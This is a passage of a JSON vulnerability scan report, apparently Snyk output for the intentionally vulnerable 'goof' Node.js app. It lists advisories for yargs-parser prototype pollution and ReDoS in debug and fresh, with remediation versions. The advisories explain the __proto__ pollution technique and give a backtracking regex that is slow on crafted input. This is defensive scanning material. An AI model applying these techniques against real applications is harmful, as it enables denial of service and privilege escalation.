`_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `yargs-parser` to version 5.0.1, 13.1.2, 15.0.1, 18.1.1 or higher.\\n## References\\n- [Command Injection PoC](https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832)\\n- [GitHub Fix Commit](https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2)\\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\\n\",\n  \"disclosureTime\": \"2020-03-16T16:35:35Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"5.0.1\",\n    \"13.1.2\",\n    \"15.0.1\",\n    \"18.1.1\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse.setKey\"\n      },\n      \"version\": [\n        \"<13.1.2\",\n        \">=14.0.0 <15.0.1\",\n        \">=16.0.0 <18.1.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse.setKey\"\n      },\n      \"version\": [\n        \"<13.1.2\",\n        \">=14.0.0 <15.0.1\",\n        \">=16.0.0 <18.1.1\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse.setKey\"\n      },\n      \"version\": [\n        \"<13.1.2\",\n        \">=14.0.0 <15.0.1\",\n        \">=16.0.0 <18.1.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"parse.setKey\"\n      },\n      \"version\": [\n        \"<13.1.2\",\n        \">=14.0.0 <15.0.1\",\n        \">=16.0.0 <18.1.1\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-YARGSPARSER-560381\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-7608\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"NSP\": [\n      \"1500\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-05-05T15:56:57.289407Z\",\n  \"moduleName\": \"yargs-parser\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"yargs-parser\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2020-03-16T16:35:33Z\",\n  \"references\": [\n    {\n      \"title\": \"Command Injection PoC\",\n      \"url\": \"https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832\"\n    },\n    {\n      \"title\": \"GitHub Fix Commit\",\n      \"url\": \"https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2\"\n    },\n    {\n      \"title\": \"Snyk Research Blog\",\n      \"url\": \"https://snyk.io/blog/prototype-pollution-minimist/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">5.0.0-security.0 <5.0.1\",\n      \">=6.0.0 <13.1.2\",\n      \">=14.0.0 <15.0.1\",\n      \">=16.0.0 <18.1.1\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"yargs@11.1.0\",\n    \"yargs-parser@9.0.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@12.6.2\",\n    \"nyc@14.0.0\",\n    \"yargs@13.2.2\",\n    \"yargs-parser@13.1.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"yargs-parser\",\n  \"version\": \"9.0.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs@11.1.0 , yargs-parser@9.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs-parser@8.1.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2017-16137"
            ],
            "ghsaid": [
              "gxpj-cx7g-858c"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:debug:20170905",
          "desc": "## Overview\r\n[`debug`](https://www.npmjs.com/package/debug) is a JavaScript debugging utility modelled after Node.js core's debugging technique..\r\n\r\n`debug` uses [printf-style](https://wikipedia.org/wiki/Printf_format_string) formatting. Affected versions of this package are vulnerable to Regular expression Denial of Service (ReDoS) attacks via the the `%o` formatter (Pretty-print an Object all on a single line). It used a regular expression (`/\\s*\\n\\s*/g`) in order to strip whitespaces and replace newlines with spaces, in order to join the data into a single line. This can cause a very low impact of about 2 seconds matching time for data 50k characters long.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `debug` to version 2.6.9, 3.1.0 or higher.\r\n\r\n## References\r\n- [GitHub Issue](https://github.com/visionmedia/debug/issues/501)\r\n- [GitHub PR](https://github.com/visionmedia/debug/pull/504)",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-DEBUG-10762\"\n  ],\n  \"creationTime\": \"2017-09-13T07:55:05.106000Z\",\n  \"credit\": [\n    \"Cristian-Alexandru Staicu\"\n  ],\n  \"cvssScore\": 3.7,\n  \"description\": \"## Overview\\r\\n[`debug`](https://www.npmjs.com/package/debug) is a JavaScript debugging utility modelled after Node.js core's debugging technique..\\r\\n\\r\\n`debug` uses [printf-style](https://wikipedia.org/wiki/Printf_format_string) formatting. Affected versions of this package are vulnerable to Regular expression Denial of Service (ReDoS) attacks via the the `%o` formatter (Pretty-print an Object all on a single line). It used a regular expression (`/\\\\s*\\\\n\\\\s*/g`) in order to strip whitespaces and replace newlines with spaces, in order to join the data into a single line. This can cause a very low impact of about 2 seconds matching time for data 50k characters long.\\r\\n\\r\\n## Details\\r\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\r\\n\\r\\n\\r\\n## Remediation\\r\\nUpgrade `debug` to version 2.6.9, 3.1.0 or higher.\\r\\n\\r\\n## References\\r\\n- [GitHub Issue](https://github.com/visionmedia/debug/issues/501)\\r\\n- [GitHub PR](https://github.com/visionmedia/debug/pull/504)\",\n  \"disclosureTime\": \"2017-09-05T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.6.9\",\n    \"3.1.0\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"src/node.js\",\n        \"functionName\": \"exports.formatters.o\"\n      },\n      \"version\": [\n        \">= 2.5.0 <2.6.9\",\n        \">=3.0.0 <3.1.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"node.js\",\n        \"functionName\": \"exports.formatters.o\"\n      },\n      \"version\": [\n        \">=1.0.0 <2.5.0\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"src/node.js\",\n        \"functionName\": \"exports.formatters.o\"\n      },\n      \"version\": [\n        \">= 2.5.0 <2.6.9\",\n        \">=3.0.0 <3.1.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"node.js\",\n        \"functionName\": \"exports.formatters.o\"\n      },\n      \"version\": [\n        \">=1.0.0 <2.5.0\"\n      ]\n    }\n  ],\n  \"id\": \"npm:debug:20170905\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-DEBUG-10762\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-16137\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-gxpj-cx7g-858c\"\n    ],\n    \"NSP\": [\n      \"534\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.626507Z\",\n  \"moduleName\": \"debug\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"debug\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:debug:20170905:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.872397Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/debug/20170905/debug_20170905_0_0_c38a0166c266a679c8de012d4eaccec3f944e685.patch\"\n      ],\n      \"version\": \">= 3.0.0 <=3.0.1\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:debug:20170905:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.873422Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/debug/20170905/debug_20170905_0_1_f53962e944a87e6ca9bb622a2a12dffc22a9bb5a.patch\"\n      ],\n      \"version\": \">=2.5.1 <2.6.9\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:debug:20170905:2\",\n      \"modificationTime\": \"2019-12-03T11:40:45.874399Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/debug/20170905/debug_20170905_0_2_f53962e944a87e6ca9bb622a2a12dffc22a9bb5a.patch\"\n      ],\n      \"version\": \">=2.4.0 <2.5.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:debug:20170905:3\",\n      \"modificationTime\": \"2019-12-03T11:40:45.875363Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/debug/20170905/debug_20170905_0_3_f53962e944a87e6ca9bb622a2a12dffc22a9bb5a.patch\"\n      ],\n      \"version\": \">=2.0.0 <2.4.0\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-09-26T03:55:05Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/visionmedia/debug/pull/504/commits/42a6ae0737f9243c80b6d3dbb08a69a7ae2a1061\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/visionmedia/debug/issues/501\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/visionmedia/debug/pull/504\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=1.0.0 <2.6.9\",\n      \">=3.0.0 <3.1.0\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"express@4.12.4\",\n    \"debug@2.2.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"express@4.15.5\",\n    \"debug@2.6.9\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"debug\",\n  \"version\": \"2.2.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , debug@2.2.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , finalhandler@0.3.6 , debug@2.2.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , send@0.12.3 , debug@2.2.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mquery@1.6.3 , debug@2.2.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , express@4.12.4 , serve-static@1.9.3 , send@0.12.3 , debug@2.2.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2017-16119"
            ],
            "ghsaid": [
              "9qj9-36jm-prpv"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:fresh:20170908",
          "desc": "## Overview\r\n[`fresh`](https://www.npmjs.com/package/fresh) is HTTP response freshness testing.\r\n\r\nAffected versions of this package are vulnerable to Regular expression Denial of Service (ReDoS) attacks. A Regular Expression (`/ *, */`) was used for parsing HTTP headers and take about 2 seconds matching time for 50k characters.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `fresh` to version 0.5.2 or higher.\n\n## References\n- [GitHub Commit](https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec)\n- [GitHub Issue](https://github.com/jshttp/fresh/issues/24)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-FRESH-10791\"\n  ],\n  \"creationTime\": \"2017-09-27T08:48:49.286000Z\",\n  \"credit\": [\n    \"Cristian-Alexandru Staicu\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\r\\n[`fresh`](https://www.npmjs.com/package/fresh) is HTTP response freshness testing.\\r\\n\\r\\nAffected versions of this package are vulnerable to Regular expression Denial of Service (ReDoS) attacks. A Regular Expression (`/ *, */`) was used for parsing HTTP headers and take about 2 seconds matching time for 50k characters.\\r\\n\\r\\n## Details\\r\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\r\\n\\r\\n\\r\\n## Remediation\\r\\nUpgrade `fresh` to version 0.5.2 or higher.\\n\\n## References\\n- [GitHub Commit](https://github.com/jshttp/fresh/commit/21a0f0c2a5f447e0d40bc16be0c23fa98a7b46ec)\\n- [GitHub Issue](https://github.com/jshttp/fresh/issues/24)\\n\",\n  \"disclosureTime\": \"2017-09-08T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.5.2\"\n  ],\n  \"functions\": [\n    